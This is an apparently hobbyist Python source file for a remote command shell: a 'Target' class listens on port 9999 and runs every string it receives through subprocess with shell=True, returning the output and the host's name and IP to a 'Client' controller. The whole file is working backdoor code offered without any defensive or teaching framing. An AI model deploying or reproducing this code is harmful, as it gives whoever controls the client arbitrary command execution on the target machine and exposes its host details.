import socket
import os
import subprocess


class Machine:
    def __init__(self):
        # create socket
        try:
            self.s = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    def quit(self):
        self.s.close()


# client is "us"
class Client(Machine):
    def __init__(self, host="127.0.0.1", port=9999):
        super().__init__()
        self.host = host
        self.port = port

    def connect_to_server(self):
        self.s.connect((self.host, self.port))

    def reverse_shell_send_command(self):
        self.s.send(str.encode("shell"))
        print("-->", end=" ")
        while True:
            cmd = input("")
            if cmd == "quit":
                print("Leaving Shell")
                input("\n\nPress ENTER")
                break
            if len(str.encode(cmd)) > 0:
                self.s.send(str.encode(cmd))
                client_response = str(self.s.recv(2048), "utf-8")
                print(client_response, end="")

    def getinfo(self):
        self.s.send(str.encode("getinfo"))
        i = 0
        while i < 3:
            info = self.s.recv(2048)
            if i == 0:
                print(info.decode("utf-8"))
            else:
                print(str(i) + " : " + info.decode("utf-8"))
            i = i + 1
        input("\n\n Press ENTER")


# Target is the server
class Target(Machine):

    # initialize host and port server
    def __init__(self, host="", port=9999):
        super().__init__()
        self.host = host
        self.port = port

    # bind de socket with the port
    def socket_bind(self):
        print("Bidding socket to port " + str(self.port))
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(5)
        except socket.error as msg:
            print("Socket binding error: " + str(msg) + "\n" + "Do you want to retry ?")
            if input() == "y" or "yes":
                self.socket_bind()

    # accept the new co
    def socket_accept(self):
        global conn
        conn, address = self.s.accept()
        print("Connexion has been establish | " + "IP " + address[0] + " | Port : " + str(address[1]))


    def what_to_do(self):
        while True:
            instruction = conn.recv(2048)
            instruction = instruction.decode("utf-8")
            if instruction == "shell":
                self.reverse_shell_target()
            if instruction == "getinfo":
                self.getinfo_target()
            if instruction == "quit":
                break

    def reverse_shell_target(self):
        while True:
            data = conn.recv(2048)
            if data.decode("utf-8") == "quit":
                break
            else:
                try:
                    if data[:2].decode("utf-8") == 'cd':
                        os.chdir(data[3:].decode("utf-8"))
                    if len(data) > 0:
                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
                        output_str = output_bytes.decode("utf-8", errors='replace')
                        conn.send(str.encode(output_str + str(os.getcwd()) + "> "))
                        print(output_str)
                except OSError as msg:
                    error_msg = "Error OS : " + str(msg)
                    print(error_msg)
                    conn.send(str.encode(error_msg))

    # Get information from the target
    def getinfo_target(self):
        conn.send(str.encode("INFORMATION'S TARGET: \n"))
        conn.send(str.encode("Computer's name: " + socket.gethostname()))
        conn.send(str.encode("IP : " + socket.gethostbyname(socket.gethostname())))

    # close de connection and the socket
    def quit(self):
        try:
            conn.close()
        except socket.error as msg:
            print("Error conn to close: " + str(msg))

        try:
            super().quit()
        except socket.error as msg:
            print("the socket fail to close : " + str(msg))


